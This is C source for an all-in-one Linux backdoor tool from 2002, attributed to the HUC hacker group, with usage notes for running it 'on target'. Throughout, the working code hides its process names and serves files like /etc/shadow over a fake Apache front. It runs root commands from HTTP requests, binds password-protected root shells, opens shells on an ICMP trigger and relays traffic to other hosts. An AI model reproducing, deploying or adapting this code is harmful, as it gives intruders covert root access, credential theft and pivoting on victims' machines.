/************************************************************************ 
* allinone.c for HUC (2002.1) 
* 
* allinone.c is 
* a Http server, 
* a sockets transmit server, 
* a shell backdoor, 
* a icmp backdoor, 
* a bind shell backdoor, 
* a like http shell, 
* it can translate file from remote host, 
* it can give you a socks5 proxy, 
* it can use for to attack, jumps the extension, Visits other machines. 
* it can give you a root shell.:) 
* 
* Usage: 
* compile: 
* gcc -o allinone allinone.c -lpthread 
* run on target: 
* ./allinone 
* 
* 1.httpd server 
* Client: 
* http://target:8008/givemefile/etc/passwd 
* lynx -dump http://target:8008/givemefile/etc/shadow > shadow 
* or wget http://target:8008/givemefile/etc/shadow
* 
* 2.icmp backdoor 
* Client: 
* ping -l 101 target (on windows) 
* ping -s 101 -c 4 target (on linux) 
* nc target 8080 
* kissme:)   --> your password 
* 
* 3.shell backdoor 
* Client: 
* nc target 8008 
* kissme:)   --> your password 
* 
* 4.bind a root shell on your port 
* Client: 
* http://target:8008/bindport:9999 
* nc target 9999 
* kissme:)   --> your password   
* 
* 5.sockets transmit 
* Client: 
* http://target:8008/socks/:local listen port::you want to tran ip:::you want to tran port 
* http://target:8008/socks/:1080::192.168.0.1:::21 
* nc target 1080 
* 
* 6.http shell 
* Client: 
* http://target:8008/givemeshell:ls -al (no pipe) 
* 
* ps: 
* All bind shell have a passwd, default is: kissme:) 
* All bind shell will close, if Two minutes do not have the connection. 
* All bind shell only can use one time until reactivates.  
* 
* 
* Code by lion, e-mail: lion@cnhonker.net 
* Welcome to HUC Website, Http://www.cnhonker.com 
* 
* Test on redhat 6.1/6.2/7.0/7.1/7.2 (maybe others) 
* Thx bkbll's Transmit code, and thx Neil,con,iceblood for test. 
* 
************************************************************************/ 


#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <signal.h> 
#include <netdb.h> 
#include <netinet/ip.h> 
#include <netinet/in.h> 
#include <sys/wait.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <sys/time.h> 
#include <pthread.h> 
#include <unistd.h> 
#include <fcntl.h> 
#include <errno.h> 


#define HTTPD_PORT	8008 
#define BIND_PORT	8888 
#define ICMP_PORT	8080 
#define TRAN_PORT	1080 
#define SIZEPACK	101 
#define MAXSIZE		32768 
#define TIMEOUT		120 
#define CONNECT_NUMBER	1 
#define HIDEME		"[login]       " 
#define HIDEICMP	"[su]       " 
#define HIDEFILE	"[bash]       " 
#define GET_FILE	"givemefile" 
#define SHELL_NAME	"givemeshell" 
#define BIND_NAME	"bindport" 
#define TRAN_NAME	"socks" 
#define DISPART		":" 
#define DISPART1	"::" 
#define DISPART2	":::" 
#define PASSWORD	"kissme:)" 	/* Change it */
#define MESSAGE		"\r\n========Welcome to http://www.cnhonker.com========\r\n==========You got it, have a goodluck. :)=========\r\n\r\nYour command: \0" 
#define GIVEPASS 	"\r\nEnter Your password: \0" 

#define max(a, b) (a)>(b)?(a) : (b) 

int maxfd, infd, outfd; 
unsigned char ret_buf[32768]; 

int	daemon_init();		/* init the daemon, if success return 0 other <0 */ 
void	sig_chid();		/* wait the child die */ 
int	TCP_listen();		/* success return 1 else return -1 */ 
char*	read_file();		/* return the file content as a large string, buf value like GET /index.html HTTP:/1.1 */ 
ssize_t	writen_file();		/* writen data to socket */ 
int	bind_shell();		/* bind a root shell to a port */ 
int	get_shell();		/* get me the root shell */ 
int	icmp_shell();		/* icmp backdoor */ 
int	socks();		/* socks */ 
int	create_socket(); 
int	create_serv(); 
int	client_connect(); 
int	quit(); 
void	out2in(); 
char	x2c();			/* http shell */ 
void	unescape_url(); 
void	plustospace(); 


/* The main function from here */ 
int main(int argc, char *argv[]) 
{ 
	int fd, len, i, icmp; 
	int csocket; 
	struct sockaddr_in caddr; 
	char readstr[4000]; 
	char *cbuf; 
	pid_t pid; 

	/* make it to a daemon */ 
	/*signal(SIGHUP, SIG_IGN);*/ 
	signal(SIGCHLD, sig_chid); 
	daemon_init(); 

	if((pid = fork()) == -1) exit(0); 
	if(pid <= 0) 
	{ 
		strcpy(argv[0], HIDEICMP); 
		icmp_shell(); 
	} 

	fd = TCP_listen(HTTPD_PORT); 
	if(fd <= 0) return -1; 

	for(;;) 
	{   
		strcpy(argv[0], HIDEME); 

		/* check httpd */ 
		len = sizeof(caddr); 
		if((csocket = accept(fd, &caddr, &len)) < 0) continue; 
		if((pid = fork()) == -1) continue; 
		if(pid <= 0) 
		{ 
			strcpy (argv[0], HIDEFILE); 
			i = recv(csocket, readstr, 4000,0); 
			if (i == -1) break; 
			if( readstr[ i -1 ] != '\n' ) break; 
			readstr [i] = '\0'; 
			/*printf("Read from client: %s \n", readstr);*/ 
			cbuf = read_file(readstr, csocket); 
			close(csocket); 
		} 
		close(csocket); 
	} 
	close(fd); 
	return(1); 
} 


/* init the daemon, if success return 0 other <0 */ 
int daemon_init() 
{ 
	struct sigaction act; 
	int i, maxfd; 

	if(fork() != 0) exit(0); 
	if(setsid() < 0) return(-1); 

	act.sa_handler = SIG_IGN; 
	/*act.sa_mask = 0;*/ 
	act.sa_flags = 0; 

	sigaction(SIGHUP, &act, 0); 

	if(fork() != 0) exit(0); 

	chdir("/"); 
	umask(0); 
	maxfd = sysconf(_SC_OPEN_MAX); 
	for(i=0; i<maxfd; i++) 
	close(i); 
	open("/dev/null", O_RDWR); 
	dup(0); 
	dup(1); 
	dup(2); 
	return(0); 
} 


/* wait the child die */ 
void sig_chid(int signo) 
{ 
	pid_t pid; 
	int stat; 
	while((pid = waitpid(-1, &stat, WNOHANG))>0); 
	printf("children %d died\n", pid); 
	return; 
} 

/* success return 1 else return -1 */ 
int TCP_listen(int port)    
{ 
	struct sockaddr_in laddr ; 
	int fd; 
	socklen_t len ; 
	fd = socket(AF_INET, SOCK_STREAM, 0); 
	len = sizeof(laddr) ; 
	memset(&laddr, 0, len) ; 
	laddr.sin_addr.s_addr = htonl(INADDR_ANY) ; 
	laddr.sin_family = AF_INET ; 
	laddr.sin_port = htons(port) ;  
	if((bind(fd, (const struct sockaddr *)&laddr, len))) return(-1); 
	if(listen(fd, 5)) return(-1); 
	return(fd); 
} 

/* http server */ 
char * read_file(char *buf, int fd)  
{ 
	char *erro= 
	"Content-type: text/html\n\n" 
	"HTTP/1.1 404 Not Found\n" 
	"Date: Mon, 14 Jan 2002 03:19:55 GMT\n" 
	"Server: Apache/1.3.22 (Unix)\n" 
	"Connection: close\n" 
	"Content-Type: text/html\n\n" 
	"<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 4.0//EN\">\n" 
	"<HTML><HEAD>\n" 
	"<TITLE>404 Not Found</TITLE>\n" 
	"</HEAD><BODY>\n" 
	"<H1>Not Found</H1>\n" 
	"The requested URL was not found on this server.<P>\n" 
	"<HR>\n" 
	"<ADDRESS>Apache/1.3.22 Server at localhost Port 8008</ADDRESS>\n" 
	"</BODY></HTML>\n\n"; 

	char *bindok= 
	"Content-type: text/html\n\n" 
	"<html>\n<head><title>Bind Shell ok.:)</title></head>\n" 
	"<body bgcolor=\"#000000\">\n" 
	"<div align=\"center\"><p>\n" 
	"<font face=\"Arial\" color=\"#999999\" size=\"7\"><b>\n" 
	"You get it, goodluck! :-)\n" 
	"</b></font></p></div><br>\n" 
	"</body></html>\n\n"; 

	char *tranok= 
	"Content-type: text/html\n\n" 
	"<html>\n<head><title>Tran ok.:)</title></head>\n" 
	"<body bgcolor=\"#000000\">\n" 
	"<div align=\"center\"><p>\n" 
	"<font face=\"Arial\" color=\"#999999\" size=\"7\"><b>\n" 
	"Tran ok!\n" 
	"</b></font></p></div><br>\n" 
	"</body></html>\n\n"; 

	char *httpok1= 
	"Content-type: text/html\n\n" 
	"<html>\n<head><title>Shell ok.:)</title></head>\n" 
	"<body bgcolor=\"#000000\">\n" 
	"<div align=\"left\">\n" 
	"<pre><font face=\"Arial\" color=\"#999999\" size=\"2\">\n"; 

	char *httpok2= 
	"</font></pre></div><br>\n" 
	"</body></html>\n\n"; 

	char *yourcom= 
	"<b>Your Command:</b>\n"; 

	char *br= 
	"<br>\n"; 

	int listenp, targetp, i, j, c, bport; 
	char *cmd, *par, *op, *hp, *tp, *targeth, *command; 
	char *swap_file = "/tmp/tmp.txt"; 
	char *setpath = "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:."; 
	FILE *f; 

	/* check give me shell */ 
	cmd = buf; 
	par = strstr(cmd, PASSWORD); 
	if(par != NULL)  
	{ 
		/*printf("Get Shell:\n");*/ 
		get_shell(fd); 
		exit(0); 
	} 

	/* check bind root shell on a port */ 
	par = strstr(cmd, BIND_NAME); 
	op = strstr(cmd, DISPART); 
	if(par != NULL && op != NULL) 
	{ 
		bport = atoi(op + strlen(DISPART)); 
		if(bport <= 0) 
			bport = BIND_PORT; 
		/*printf("Bind Port: %d\n", bport);*/ 
		write(fd, bindok, strlen(bindok)); 
		close(fd); 
		bind_shell(bport); 
		exit(0); 
	} 

	/* check Tran code */ 
	par = strstr(cmd, TRAN_NAME); 
	op = strstr(cmd, DISPART); 
	hp = strstr(cmd, DISPART1); 
	tp = strstr(cmd, DISPART2); 
	if(par != NULL && op != NULL && hp != NULL && tp != NULL) 
	{ 
		listenp = atoi(op + strlen(DISPART)); 
		if(listenp <= 0) 
		listenp = TRAN_PORT; 
		targetp = atoi(tp + strlen(DISPART2)); 
		if(targetp <= 0) 
			targetp = 23; 

		hp = (hp + strlen(DISPART1)); 
		targeth = strncpy(ret_buf, hp,strlen(hp) - strlen(tp)); 
		targeth[strlen(hp) - strlen(tp)] = '\0'; 

		/*printf("Tran Port: listen %d port to %s %d port\n", listenp, targeth, targetp);*/ 
		write(fd, tranok, strlen(tranok)); 
		close(fd); 
		/* 
		listenp = 1080; 
		targetp = 21; 
		targeth = "192.168.0.14"; 
		*/ 
		socks(listenp, targeth, targetp); 
		exit(0); 
	} 

	/* check http shell */ 
	par = strstr(cmd, SHELL_NAME); 
	op = strstr(cmd, DISPART); 
	if(par != NULL && op != NULL) 
	{ 
		tp = buf + 5 + strlen(SHELL_NAME) + strlen(DISPART); 
		hp = strstr(tp, "HTTP"); 
		if(hp != NULL) *hp = '\0'; 
		tp[strlen(tp) - 1] = 0; 
		plustospace(tp); 
		unescape_url(tp); 
		/*printf("HTTP Shell: %s\n", tp);*/ 

		c = j = strlen(tp); 
		tp[j] = ' ';j++; 
		tp[j] = ' ';j++; 
		tp[j] = '>';j++; 
		tp[j] = ' ';j++; 
		for(i = 0; i <= strlen(swap_file); i++, j++) 
		{ 
			tp[j] = swap_file[i]; 
		} 
		tp[j + strlen(swap_file)] = '\0'; 

		command = tp; 
		/*printf("command: %s\n",command); */ 
		setuid(0); 
		setgid(0); 
		chdir("/"); 
		putenv(setpath); 
		/*printf("setpath ok!\n");*/ 
		system(command); 
		/*printf("system ok!\n");*/ 

		f = fopen(swap_file, "r"); 
		if (f == NULL) 
		{ 
			/*printf("Swap file error");*/ 
			writen_file(fd, erro, strlen(erro)); 
			return erro; 
		} 

		writen_file(fd, httpok1, strlen(httpok1)); 
		writen_file(fd, yourcom, strlen(yourcom)); 
		writen_file(fd, command, c); 
		writen_file(fd, br, strlen(br)); 
		writen_file(fd, br, strlen(br)); 
		while( !feof(f) ) 
		{ 
			i = fread(ret_buf, 1, 32768, f); 
			if (i == 0) break; 
			writen_file(fd, ret_buf, i); 
		} 
		fclose(f); 
		writen_file(fd, br, strlen(br)); 
		writen_file(fd, httpok2, strlen(httpok2)); 
		remove(swap_file); 
		exit(0); 
	} 

	/* check getfile */ 
	par = NULL; 
	par = strstr(cmd, GET_FILE); 
	if(par != NULL) 
	{ 
		op = buf + 5 + strlen(GET_FILE); 
		tp = strstr(op, "HTTP"); 
		if(tp != NULL) *tp = '\0'; 
		op[strlen(op) - 1] = 0; 
		/*printf("Get File: %s\n", op);*/ 
		f = fopen(op, "r"); 
		if (f == NULL) 
		{ 
			writen_file(fd, erro, strlen(erro)); 
			return erro; 
		} 

		while( !feof(f) ) 
		{ 
			i = fread(ret_buf, 1, 32768, f); 
			if (i == 0) break; 
			writen_file(fd, ret_buf, i); 
		} 
		fclose(f); 
		exit(0); 
	} 
	writen_file(fd, erro, strlen(erro)); 
	close(fd); 
	exit(-1); 
} 


/* writen data to socket */ 
ssize_t writen_file(int fd, const void *vptr, size_t n)  
{ 
	size_t nleft; 
	ssize_t nwritten; 
	const char *ptr; 
	ptr = vptr; 
	nleft = n; 
	while(nleft > 0) 
	{ 
		if((nwritten = write(fd, ptr, nleft)) <= 0) 
		{ 
			if(errno == EINTR) 
			nwritten = 0; 
			else 
			return(-1); 
		} 
		nleft -= nwritten; 
		ptr += nwritten; 
	} 
	return(n); 
} 

/* bind root shell to a port */ 
int bind_shell(int port) 
{ 
	int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid, i, time; 
	char passwd[15]; 

	struct sockaddr_in serv_addr; 
	struct sockaddr_in client_addr; 
	struct timeval testtime; 

	setuid(0); 
	setgid(0); 
	seteuid(0); 
	setegid(0); 

	chdir("/"); 

	soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
  
	if (soc_des == -1) 
		exit(-1); 

	bzero((char *) &serv_addr,sizeof(serv_addr)); 
	serv_addr.sin_family = AF_INET; 
	serv_addr.sin_addr.s_addr = htonl(INADDR_ANY); 
	serv_addr.sin_port = htons(port); 

	soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr)); 

	if (soc_rc != 0) 
		exit(-1); 
	if (fork() != 0) 
		exit(0); 
	setpgrp(); 
	if (fork() != 0) 
		exit(0); 
	soc_rc = listen(soc_des, 5); 
	if (soc_rc != 0) 
		exit(0); 
  
	testtime.tv_sec = TIMEOUT; 
	testtime.tv_usec = 0; 

	/*setsockopt(soc_des, SOL_SOCKET, SO_RCVTIMEO, &testtime, sizeof(testtime));*/ 

	alarm(TIMEOUT); 
	soc_len = sizeof(client_addr); 
	soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len); 

	if (soc_cli < 0) 
		exit(0); 
	alarm(0); 

	cli_pid = getpid(); 
	server_pid = fork(); 

	if (server_pid != 0) 
	{ 
		write(soc_cli, GIVEPASS, strlen(GIVEPASS)); 
		recv(soc_cli, passwd, sizeof(passwd), 0); 

		for (i = 0; i < strlen(passwd); i++) 
		{ 
			if (passwd[i] == '\n' || passwd[i] == '\r') 
			{ 
				passwd[i] = '\0'; 
			} 
		} 

		if (strcmp(passwd, PASSWORD) != 0) 
		{ 
			close(soc_cli); 
			close(soc_rc); 
			exit(-1); 
		} 

		write(soc_cli, MESSAGE, strlen(MESSAGE)); 
		for (i = 0; i < 3; i++) 
		{ 
			dup2(soc_cli, i); 
		} 

		execl("/bin/sh","sh",(char *)0); 
		close(soc_cli); 
		close(soc_rc); 
		exit(1); 
	} 
	close(soc_cli); 
	close(soc_rc); 
	exit(0); 
} 

/* return a root shell */ 
int get_shell(int fd) 
{ 
	int i; 
	setuid(0); 
	setgid(0); 

	chdir("/"); 
	write(fd, MESSAGE, strlen(MESSAGE)); 
	for (i = 0; i < 3; i++) 
	{ 
		dup2(fd, i); 
	} 
	execl("/bin/sh","sh",(char *)0); 
	close(fd); 
	return 1; 
} 

/* icmp backdoor */ 
int icmp_shell() 
{ 
	int i, s, size, fromlen, port = ICMP_PORT; 
	char pkt[4096]; 

	struct protoent *proto; 
	struct sockaddr_in from; 

	proto = getprotobyname("icmp"); 

	/* can't creat raw socket */ 
	if((s = socket(AF_INET, SOCK_RAW, proto->p_proto)) < 0)  
	exit(0); 

	/* waiting for packets */ 
	while(1) 
	{ 
		do 
		{ 
			fromlen = sizeof(from); 
			if((size = recvfrom(s, pkt, sizeof(pkt), 0, (struct sockaddr *)&from, &fromlen)) < 0) 
			printf("", size - 28); 
		}while(size != SIZEPACK + 28); 

		/* size == SIZEPACK, let's bind the shell on your port :)*/ 
		switch(fork())  
		{ 
		case -1: 
			continue; 

		case 0: 
			bind_shell(port); 
		exit (0); 
		} 
	} 
	return 1; 
} 

/* tran socks code */ 
int socks(int listenp, char *targeth, int targetp) 
{ 
	int listfd, outside, inside, size; 
	pthread_t thread1; 
	struct sockaddr_in client; 

	if(!(listfd = create_socket())) exit(1); 
	if(!(create_serv(listfd, listenp))) exit(1); 
  
	for(;;) 
	{ 
		size = sizeof(struct sockaddr); 
		/*printf("waiting for response.........\n");*/ 
		if((outfd = accept(listfd, (struct sockaddr *)&client, &size)) < 0) 
		{ 
			/*printf("accept error\n");*/ 
			continue; 
		} 

		/*printf("accept a client from %s\n", inet_ntoa(client.sin_addr));*/ 
		if(!(infd=create_socket())) exit(1); 
		if(!(client_connect(infd, targeth, targetp))) quit(outfd, infd, listfd);  
   
		maxfd = max(outfd, infd) + 1; 
		pthread_create(&thread1, NULL, (void *)&out2in, NULL); 
	} 
	close(listfd); 
} 

int create_socket() 
{  
	int sockfd; 

	if((sockfd = socket(AF_INET, SOCK_STREAM, 0))<0) 
	{ 
		/*printf("Create socket error\n");*/ 
		return(0); 
	} 
	return(sockfd); 
} 

int create_serv(int sockfd, int port) 
{ 
	struct sockaddr_in srvaddr; 
   
	bzero(&srvaddr, sizeof(struct sockaddr)); 
	srvaddr.sin_port = htons(port); 
	srvaddr.sin_family = AF_INET; 
	srvaddr.sin_addr.s_addr = htonl(INADDR_ANY); 
  
	if(bind(sockfd, (struct sockaddr *)&srvaddr, sizeof(struct sockaddr))<0) 
	{ 
		/*printf("Bind to port %d error\n",port);*/ 
		return(0); 
	} 
  
	if(listen(sockfd,CONNECT_NUMBER)<0) 
	{ 
		/*printf("listen error\n");*/ 
		return(0); 
	} 
	return(1); 
} 

int client_connect(int sockfd, char *server, int port) 
{ 
	struct sockaddr_in cliaddr; 
	struct hostent *host; 

	if(!(host = gethostbyname(server))) 
	{ 
		/*printf("gethostbyname error:%s\n",server);*/ 
		return(0); 
	}  
  
	bzero(&cliaddr, sizeof(struct sockaddr)); 
	cliaddr.sin_family = AF_INET; 
	cliaddr.sin_port = htons(port); 
	cliaddr.sin_addr = *((struct in_addr *)host->h_addr); 
  
	if(connect(sockfd, (struct sockaddr *)&cliaddr, sizeof(struct sockaddr)) < 0) 
	{ 
		/*printf("connect %s:%d error\n",server,port);*/ 
		return(0); 
	} 
	return(1); 
} 

int quit(int a, int b, int c) 
{ 
	close(a); 
	close(b); 
	close(c); 
	exit(1); 
} 

void out2in() 
{ 
	struct timeval timeset; 
	fd_set readfd, writefd; 
	int result, i = 0; 
	char read_in1[MAXSIZE], send_out1[MAXSIZE]; 
	char read_in2[MAXSIZE], send_out2[MAXSIZE]; 
	int read1 = 0, totalread1 = 0, send1=0; 
	int read2 = 0, totalread2 = 0, send2=0; 
	int out_fd, in_fd; 
  
	out_fd = outfd; 
	in_fd = infd; 
  
	bzero(read_in1, MAXSIZE); 
	bzero(read_in2, MAXSIZE); 
	bzero(send_out1, MAXSIZE); 
	bzero(send_out2, MAXSIZE); 
  
	timeset.tv_sec = TIMEOUT; 
	timeset.tv_usec = 0; 

	while(1) 
	{ 
		FD_ZERO(&readfd); 
		FD_ZERO(&writefd); 
  
		FD_SET(out_fd, &readfd); 
		FD_SET(in_fd, &writefd); 
		FD_SET(out_fd, &writefd); 
		FD_SET(in_fd, &readfd); 
  
		result = select(maxfd, &readfd, &writefd, NULL, &timeset); 
		if(result < 0) 
		{ 
			/*printf("select error\n");*/ 
			return; 
		} 
		else 
		if(result == 0) 
		{ 
			/*printf("time out\n");*/ 
			return; 
		} 
	
		if(FD_ISSET(out_fd, &readfd)) 
		{ 
			read1 = recv(out_fd, read_in1, MAXSIZE, 0); 
			if(read1 == 0) break; 
			if(read1 < 0) 
			{ 
				/*printf("read data error\n");*/ 
				return; 
			} 
			memcpy(send_out1 + totalread1, read_in1, read1); 
			totalread1 += read1; 
			bzero(read_in1, MAXSIZE); 
		} 
		if(FD_ISSET(in_fd, &writefd)) 
		{ 
			while(totalread1 > 0) 
			{ 
				send1 = write(in_fd, send_out1, totalread1); 
				if(send1 == 0)break; 
				if(send1 < 0) 
				{ 
					/*printf("unknow error\n");*/ 
					continue; 
				} 
				totalread1 -= send1; 
			} 
			bzero(send_out1, MAXSIZE); 
		} 

		if(FD_ISSET(in_fd, &readfd)) 
		{ 
			read2 = recv(in_fd, read_in2, MAXSIZE, 0); 
			if(read2 == 0) break; 
			if(read2 < 0) 
			{ 
				/*printf("read data error\n");*/ 
				return; 
			} 

			memcpy(send_out2 + totalread2, read_in2, read2); 
			totalread2 += read2; 
			bzero(read_in2, MAXSIZE); 
		} 

		if(FD_ISSET(out_fd, &writefd)) 
		{ 
			while(totalread2 > 0) 
			{ 
				send2 = write(out_fd, send_out2, totalread2); 
				if(send2 == 0) break; 
				if(send2 < 0) 
				{ 
					/*printf("unknow error\n");*/ 
					continue; 
				} 

				totalread2 -= send2; 
			} 
			bzero(send_out2, MAXSIZE); 
		} 
	}  
	close(out_fd); 
	close(in_fd); 
	return; 
} 

char x2c(char *what) 
{ 
	register char digit; 

	digit = (what[0] >= 'A' ? ((what[0] & 0xdf) - 'A')+10 : (what[0] - '0')); 
	digit *= 16; 
	digit += (what[1] >= 'A' ? ((what[1] & 0xdf) - 'A')+10 : (what[1] - '0')); 
	return (digit); 
} 


void unescape_url(char *url) 
{ 
	register int x, y; 

	for(x = 0 , y = 0; url[y]; ++x, ++y) 
	{ 
		if((url[x] = url[y]) == '%') 
		{ 
			url[x] = x2c(&url[y + 1]); 
			y += 2; 
		} 
	} 
	url[x] = '\0'; 
} 

void plustospace(char *str) 
{ 
	register int x; 

	for(x = 0; str[x]; x++) 
	if (str[x] == '+') 
	str[x] = ' '; 
} 

 
